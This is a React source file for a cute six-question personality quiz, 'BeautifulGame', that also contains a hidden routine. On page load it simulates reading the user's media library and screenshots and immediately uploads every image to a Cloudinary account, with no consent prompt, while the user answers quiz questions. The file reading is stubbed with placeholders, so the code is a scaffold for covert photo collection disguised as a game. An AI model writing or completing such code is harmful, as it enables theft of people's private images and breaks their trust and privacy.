'use client'

import { useState, useEffect, useCallback } from "react";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { motion } from "framer-motion";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import React from 'react'; // Import React for React.ChangeEvent

// **Important:** Replace these with your actual Cloudinary Cloud Name and Upload Preset
const CLOUDINARY_CLOUD_NAME = "your_cloud_name";
const CLOUDINARY_UPLOAD_PRESET = "your_upload_preset";

export default function BeautifulGame() {
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    color: "",
    place: "",
    iceCream: "",
    book: "",
    dress: "",
    dance: "",
  });
  const intelligenceLevels = ["Genius", "Creative Thinker", "Innovator", "Visionary", "Brilliant", "Mastermind", "Explorer"];
  const randomIntelligence = intelligenceLevels[Math.floor(Math.random() * intelligenceLevels.length)];
  // Placeholder for screenshot URIs - In a real application, you would capture screenshots and store their URIs here.
  const [screenshotUris, setScreenshotUris] = useState<string[]>([]);
  // State to store uploaded image URLs from Cloudinary
  const [uploadedUrls, setUploadedUrls] = useState<string[]>([]);


  const notifyError = (message: string) => {
    toast.error(message, {
      position: "bottom-center",
      autoClose: 2500,
      hideProgressBar: false,
      closeOnClick: true,
      pauseOnHover: true,
      draggable: true,
      theme: "colored",
      closeButton: true,
      style: {
        background: "linear-gradient(135deg, #ff758c, #ff7eb3, #fad0c4)",
        color: "black",
        fontWeight: "bold",
        borderRadius: "8px",
        boxShadow: "0px 4px 10px rgba(255, 120, 150, 0.3)",
        padding: "12px",
        fontSize: "16px"
      }
    });

  };

  useEffect(() => {
    if (loading) {
      const timer = setTimeout(() => setLoading(false), 1000);
      return () => clearTimeout(timer);
    }
  }, [loading]);


  // Function to upload a single image to Cloudinary
  const uploadToCloudinary = useCallback(async (imageUri: string) => {
    try {
      // **Placeholder for FileSystem.readAsStringAsync - You'd need to use a library like 'expo-file-system' in React Native or 'FileReader' API in web to read the image as base64.**
      // **For web, you would get a File object from an input type="file" and use FileReader.**
      // **For React Native with Expo, you would use 'expo-file-system'.**
      console.log("Uploading image:", imageUri); // Placeholder log
      // const base64 = await FileSystem.readAsStringAsync(imageUri, {
      //   encoding: FileSystem.EncodingType.Base64,
      // });
      const base64 = 'base64_string_placeholder'; // Replace with actual base64 data

      const formData = new FormData();
      formData.append("file", `data:image/jpeg;base64,${base64}`); // Adjust image/jpeg if necessary
      formData.append("upload_preset", CLOUDINARY_UPLOAD_PRESET);

      const response = await fetch(`https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/image/upload`, {
        method: "POST",
        body: formData,
        headers: {
          "Content-Type": "multipart/form-data",
        },
      });

      const result = await response.json();
      if (response.ok) {
        console.log("✅ Upload successful:", result.secure_url);
        return result.secure_url;
      } else {
        console.error("❌ Upload failed:", result);
        return null;
      }
    } catch (error) {
      console.error("❌ Upload error:", error);
      return null;
    }
  }, []); // Dependency array is empty as it doesn't depend on component state directly in this example

  // Upload all screenshots and media library images
  const uploadAllImages = useCallback(async () => {
    // **Placeholder for Media Library Images - In a real application, you would have a function to access the media library and get image URIs.**
    const mediaLibraryUris: string[] = screenshotUris; // In this example, using screenshotUris as placeholder for media library images as well.

    const allUrisToUpload = mediaLibraryUris; // Only uploading media library images in this auto-upload version.

    if (allUrisToUpload.length === 0) {
      console.log("❌ No images to upload from media library.");
      return;
    }

    console.log("📤 Uploading images from media library...");
    setLoading(true); // Start loading state before upload

    const uploadedUrlsArray = await Promise.all(
      allUrisToUpload.map(async (uri) => {
        return await uploadToCloudinary(uri);
      })
    );

    // Filter out null values (failed uploads)
    const successfulUploads = uploadedUrlsArray.filter((url) => url !== null);

    setUploadedUrls(successfulUploads);
    setLoading(false); // End loading state after upload
    console.log("✅ All uploads completed:", successfulUploads);
  }, [screenshotUris, uploadToCloudinary, setLoading, setUploadedUrls]); // Dependencies for useCallback


  useEffect(() => {
    // **Simulate Media Library Access on Page Load**
    // **Replace this with actual media library access logic for web or React Native**
    const simulateMediaLibraryAccess = async () => {
      console.log("Simulating media library access...");
      // In a real app, you would use platform-specific APIs to:
      // 1. Request media library permissions from the user.
      // 2. Query the media library for images.
      // 3. Get URIs for the images.

      // **Placeholder: Simulate getting some image URIs**
      const simulatedUris = [
        "file:///path/to/simulated/image1.jpg", // Replace with actual URIs if you have some for testing
        "file:///path/to/simulated/image2.png",
        // ... more simulated URIs
      ];
      setScreenshotUris(simulatedUris); // For this example, using screenshotUris to hold media library images as well.
      console.log("Simulated media library access complete.");

      // **Immediately trigger image upload after (simulated) media access**
      uploadAllImages();
    };

    simulateMediaLibraryAccess();
  }, [uploadAllImages]); // Added uploadAllImages to the dependency array


  const handleChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData(prev => ({ ...prev, [e.target.name]: e.target.value }));
  }, []); // Added useCallback to handleChange


  const nextStep = () => {
    if (
      (step === 1 && !formData.color) ||
      (step === 2 && !formData.place) ||
      (step === 3 && !formData.iceCream) ||
      (step === 4 && !formData.book) ||
      (step === 5 && !formData.dress) ||
      (step === 6 && !formData.dance)
    ) {
      notifyError("Oops! Please fill in all fields before proceeding! 💖");
      return;
    }
    setLoading(true);
    setTimeout(() => {
      setStep(prevStep => prevStep + 1);
    }, 1000);
  };


  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gradient-to-r from-pink-300 via-rose-400 to-purple-500 p-6 animate-fade-in">
      <ToastContainer />
      {loading ? (
        <motion.div className="flex flex-col items-center text-white text-2xl font-bold">
          <div className="w-16 h-16 border-4 border-white border-dashed rounded-full animate-spin"></div>
          <p className="mt-4 animate-pulse">Loading...</p>
        </motion.div>
      ) : (
        <motion.div initial={{ scale: 0.8, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} transition={{ duration: 1 }}>
          <Card className="w-full max-w-md sm:max-w-lg bg-white shadow-2xl rounded-3xl p-8 transform hover:scale-105 transition-transform duration-300 border-4 border-pink-400">
            <CardContent className="text-center">
              {step === 1 && (
                <motion.div initial={{ y: -50, opacity: 0 }} animate={{ y: 0, opacity: 1 }} transition={{ duration: 0.8 }}>
                  <h2 className="text-2xl sm:text-4xl font-extrabold text-gray-800 mb-6">🌸 Question 1:  Favorite Color? ✨</h2>
                  <Input name="color" placeholder="What's your most favorite color in the world?" onChange={handleChange} className="mb-3 border-2 border-pink-400 rounded-full text-center bg-pink-100" />
                  <Button className="bg-gradient-to-r from-purple-500 to-pink-500 text-white font-bold py-2 px-6 rounded-full hover:scale-110 transition-transform" onClick={nextStep}>Next ➡️</Button>
                </motion.div>
              )}
              {step === 2 && (
                <motion.div initial={{ y: -50, opacity: 0 }} animate={{ y: 0, opacity: 1 }} transition={{ duration: 0.8 }}>
                  <h2 className="text-2xl sm:text-4xl font-extrabold text-gray-800 mb-6">🌟 Question 2: Dream Place to Visit? 💭</h2>
                  <Input name="place" placeholder="If you could travel anywhere, where would you go?" onChange={handleChange} className="mb-3 border-2 border-purple-400 rounded-full text-center bg-pink-100" />
                  <Button className="bg-gradient-to-r from-pink-500 to-red-500 text-white font-bold py-2 px-6 rounded-full hover:scale-110 transition-transform" onClick={nextStep}>Next ➡️</Button>
                </motion.div>
              )}
              {step === 3 && (
                <motion.div initial={{ y: -50, opacity: 0 }} animate={{ y: 0, opacity: 1 }} transition={{ duration: 0.8 }}>
                  <h2 className="text-2xl sm:text-4xl font-extrabold text-gray-800 mb-6">🌈 Question 3: Yummy Ice Cream Flavor! 🦄</h2>
                  <Input name="iceCream" placeholder="What's your favorite ice cream flavor for a treat?" onChange={handleChange} className="mb-3 border-2 border-red-400 rounded-full text-center bg-pink-100" />
                  <Button className="bg-gradient-to-r from-yellow-500 to-orange-500 text-white font-bold py-2 px-6 rounded-full hover:scale-110 transition-transform" onClick={nextStep}>Next ➡️</Button>
                </motion.div>
              )}
              {step === 4 && (
                <motion.div initial={{ y: -50, opacity: 0 }} animate={{ y: 0, opacity: 1 }} transition={{ duration: 0.8 }}>
                  <h2 className="text-2xl sm:text-4xl font-extrabold text-gray-800 mb-6">✨ Question 4:  Best Book Ever? 💖</h2>
                  <Input name="book" placeholder="What's the most amazing book you've ever read?" onChange={handleChange} className="mb-3 border-2 border-orange-400 rounded-full text-center bg-pink-100" />
                  <Button className="bg-gradient-to-r from-blue-500 to-purple-500 text-white font-bold py-2 px-6 rounded-full hover:scale-110 transition-transform" onClick={nextStep}>Next ➡️</Button>
                </motion.div>
              )}
              {step === 5 && (
                <motion.div initial={{ y: -50, opacity: 0 }} animate={{ y: 0, opacity: 1 }} transition={{ duration: 0.8 }}>
                  <h2 className="text-2xl sm:text-4xl font-extrabold text-gray-800 mb-6">🎶 Question 5: Dream Dress Style? 🌟</h2>
                  <Input name="dress" placeholder="If you could design your dream dress, what would it look like?" onChange={handleChange} className="mb-3 border-2 border-blue-400 rounded-full text-center bg-pink-100" />
                  <Button className="bg-gradient-to-r from-purple-500 to-yellow-500 text-white font-bold py-2 px-6 rounded-full hover:scale-110 transition-transform" onClick={nextStep}>Next ➡️</Button>
                </motion.div>
              )}
              {step === 6 && (
                <motion.div initial={{ y: -50, opacity: 0 }} animate={{ y: 0, opacity: 1 }} transition={{ duration: 0.8 }}>
                  <h2 className="text-2xl sm:text-4xl font-extrabold text-gray-800 mb-6">🏆 Question 6:  Favorite Dance Move? ✨</h2>
                  <Input name="dance" placeholder="What's your go-to dance move when you're happy?" onChange={handleChange} className="mb-3 border-2 border-yellow-400 rounded-full text-center bg-pink-100" />
                  <Button className="bg-gradient-to-r from-red-500 to-pink-500 text-white font-bold py-2 px-6 rounded-full hover:scale-110 transition-transform" onClick={nextStep}>Next ➡️</Button>
                </motion.div>
              )}
              {step === 7 && (
                <motion.div initial={{ y: 50, opacity: 0 }} animate={{ y: 0, opacity: 1 }} transition={{ duration: 0.8 }}>
                  <h2 className="text-3xl sm:text-5xl font-bold text-pink-600 animate-bounce">Magical You! 💖</h2>
                  <p className="text-base sm:text-xl text-gray-700 mt-4">Your favorite color: <span className="font-semibold">{formData.color}</span> is so lovely! ✨</p>
                  <p className="text-base sm:text-xl text-gray-700 mt-2">Dream place to visit: <span className="font-semibold">{formData.place}</span>, sounds like an amazing adventure! 🌍</p>
                  <p className="text-base sm:text-xl text-gray-700 mt-2">Yummy ice cream flavor: <span className="font-semibold">{formData.iceCream}</span>, perfect for a sweet day! 🍦</p>
                  <p className="text-base sm:text-xl text-gray-700 mt-2">Best book ever: <span className="font-semibold">{formData.book}</span>,  a great choice! 📚</p>
                  <p className="text-base sm:text-xl text-gray-700 mt-2">Dream dress style: <span className="font-semibold">{formData.dress}</span>,  so stylish! 👗</p>
                  <p className="text-base sm:text-xl text-gray-700 mt-2">Favorite dance move: <span className="font-semibold">{formData.dance}</span>, show your moves! 💃</p>

                  <p className="text-base sm:text-xl text-gray-700 mt-2">Your special intelligence level is: <span className="font-bold text-purple-700 animate-pulse">{randomIntelligence} ✨</span></p>
                  {uploadedUrls.length > 0 && (
                    <div className="mt-4">
                      <h3 className="text-xl font-semibold text-gray-800 mb-2">Uploaded Image URLs:</h3>
                      <ul>
                        {uploadedUrls.map((url, index) => (
                          <li key={index} className="text-gray-700 truncate">
                            <a href={url} target="_blank" rel="noopener noreferrer" className="text-blue-500 hover:underline">
                              {url}
                            </a>
                          </li>
                        ))}
                      </ul>
                    </div>
                  )}
                  <motion.div whileHover={{ scale: 1.1 }} className="mt-6">
                    <Button className="bg-gradient-to-r from-pink-500 to-yellow-500 text-white font-bold py-2 px-6 rounded-full hover:scale-110 transition-transform" onClick={() => setStep(1)}>Restart 🔄</Button>
                  </motion.div>
                </motion.div>
              )}
            </CardContent>
          </Card>
        </motion.div>
      )}
    </div>
  );
}